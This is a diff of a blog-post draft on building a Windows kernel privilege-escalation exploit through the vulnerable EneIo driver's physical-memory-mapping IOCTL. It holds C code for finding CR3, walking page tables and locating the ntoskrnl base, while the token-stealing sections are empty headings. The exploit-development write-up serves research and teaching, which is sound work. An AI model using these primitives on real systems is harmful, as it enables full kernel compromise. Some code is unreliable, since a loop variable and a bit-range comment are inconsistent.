@@ -8,7 +8,7 @@ This got me thinking about how I might write a privilege escalation exploit that
 
 The CVE isn't really what I am interested in, any CVE with a physical read/write primitive would do.
 
-# The Basics
+## The Basics
 
 If you are reading this then I assume you know how a driver works and how we can connect to it from user-mode. If not, feel free to read some of my other posts. The symbolic name for the driver is `\\.\EneIo` and the vulnerable IOCTL I decided to target is `0x80102040`. Short story: this IOCTL maps the physical memory in kernel-space to a virtual address space in user-space.
 
@@ -42,11 +42,11 @@ ULONGLONG MapMemory(HANDLE hDevice, ULONGLONG* SizeOfMapping) {
 
 The struct contains five `ULONGLONG` fields but only two of them are used: `Size` is the size of the mapping, and `MappingAddress` the virtual allocation that has been assigned by the kernel. Notice that the `map` variable is passed in as the user input and the user output. Once the `DeviceIOControl` is completed the `map` variable is popoulated with the two revelant variables.
 
-# Virtual Address to Physical Memory Mapping
+## Virtual Address to Physical Memory Mapping
 
 
 
-# Dicovering the CR3 Value
+## Dicovering the CR3 Value
 
 In the Windows OS the `HalpLMStub` function is the final stub call, in a series of stubs, that applies page tables and performs various initialisation before jumping to the main kernel. A reference to this function is written to physical memory between addresses `0x10000` and `0x20000` and is randomised. 
 
@@ -58,9 +58,6 @@ Once we have a mapping of physical memory we can search the pages between `0x100
 
 ```c
 DWORD FindCR3Value(ULONGLONG VirtualAddressBase, DWORD* cr3Page) {
-
-    DWORD count = 0;
-
     // the final stub reference is always between 0x10000 and 0x20000
     for (DWORD page = 0x10000; pageIndex <= 0x20000; pageIndex += 0x1000) {
         // CR3 value is at an offset of 0xA0
@@ -83,16 +80,80 @@ DWORD FindCR3Value(ULONGLONG VirtualAddressBase, DWORD* cr3Page) {
 }
 ```
 
+Now we have a reference to the `SYSTEM` page tables it would make sens to go for the `ntoskrnl` base address. We have a reference to the `HalpLMStub` function which is at an offset to the base of §ntoskrnl§. In normal circumstances we might use WinDbg to find that offset but I want to explore how I could make it version independant.
 
+## Discovering NTOSKRNL Base
 
-# Discovering NTOSKRNL Base
+What I decided to try out was to take the mapped memory (`VirtualAddressBase`) and search it looking for the first `MZ` value in memory. To ensure it was the `ntoskrnl` header signature I started searching at an address way before the function address after masking out the five least significant nibbles (love that word). 
 
-# Discovering Processes
+```c
+ULONGLONG GetNtBaseFromCR3Page(ULONGLONG VirtualAddressBase, DWORD cr3Page, DWORD cr3) {
+    // read the function address
+    DWORD64 halpLMStub = *((DWORD64*)(VirtualAddressBase + (ULONGLONG)cr3Page) + 0xe);
 
-# Discovering Privileged Processes
+    // try to find MZ
+    for (ULONGLONG i = 0x100000; i > 0x0; i--) {
+        ULONGLONG read = (halpLMStub & 0xfffffffffff00000) - (i * 0x1000);
 
-# Token Stealing
+        ULONGLONG physAddr = GetPhysicalAddress(cr3, read, VirtualAddressBase);
+        ULONGLONG possibleBase = *((DWORD64*)(VirtualAddressBase + physAddr));
 
-# Conclusion
+        if ((possibleBase & 0xffff) == 0x5a4d) {
+            return read;
+        }
+    }
+
+    // failed
+    return 0x0;
+}
+```
+
+I'm sure somebody could make this more efficient but it works. Another thought was that I could trnaslate the `HalpLMStub` to a physical address using the `GetPhysicalAddress` function and do a more targetted search for the signature.
+
+The helper functions are shown below (if you are using the code don't forget the struct I haven't included):
+
+```c
+void ExtractPageTableIndices(DWORD64 virtualAddress, PAGE_TABLE_INDICES* indices)
+{
+    indices->pml4Index = (virtualAddress >> 39) & 0x1FF;     // Bits 39-47
+    indices->pdpIndex = (virtualAddress >> 30) & 0x1FF;      // Bits 30-38
+    indices->pdIndex = (virtualAddress >> 21) & 0x1FF;       // Bits 21-29
+    indices->ptIndex = (virtualAddress >> 12) & 0x1FF;       // Bits 12-20
+    indices->offset = virtualAddress & 0xFFF;                // Bits 0-1
+}
+
+ULONGLONG GetPhysicalAddress(ULONGLONG PmlBase, ULONGLONG VirtualAddressToResolve, ULONGLONG UserModeAddress) {
+    PAGE_TABLE_INDICES indices;
+    ExtractPageTableIndices(VirtualAddressToResolve, &indices);
+
+    ULONGLONG pml4e = *((ULONGLONG*)(UserModeAddress + PmlBase + (8 * indices.pml4Index)));
+    ULONGLONG pdpt = pml4e & 0xFFFFFFFF000;
+
+    ULONGLONG pdpte = *((DWORD64*)(UserModeAddress + pdpt + (8 * indices.pdpIndex)));
+    ULONGLONG pdt = pdpte & 0xFFFFFFFF000;
+
+    ULONGLONG pde = *((DWORD64*)(UserModeAddress + pdt + (8 * indices.pdIndex)));
+
+    // is the 'large-page' flag set
+    if (pde & (1ULL << 7)) {
+        ULONGLONG pte = pde & 0xFFFFFFFF000;
+        pte += (indices.ptIndex << 12);
+        pte += indices.offset;
+        return pte;
+    }
+    else {
+        // todo: kernel seems to be mapped as large pages so don't care for now
+        return 0;
+    }
+}
+```
+
+## Discovering Processes
+
+## Discovering Privileged Processes
+
+## Token Stealing
+
+## Conclusion
 
 [Home](https://plackyhacker.github.io)
